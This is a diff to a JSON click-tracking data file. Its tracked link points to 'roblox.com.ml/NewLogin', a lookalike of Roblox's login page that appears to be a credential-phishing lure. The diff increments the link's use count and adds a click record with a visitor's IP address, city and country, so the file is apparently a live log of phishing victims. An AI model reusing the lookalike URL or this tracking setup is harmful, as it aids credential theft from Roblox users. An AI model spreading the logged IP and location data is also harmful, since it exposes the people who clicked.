@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 675,
+    "useCount": 676,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5512,6 +5512,14 @@
         "city": "Santo Domingo",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777129924474,
+        "ip": "139.135.241.16",
+        "country": "Philippines",
+        "city": "Pasig",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
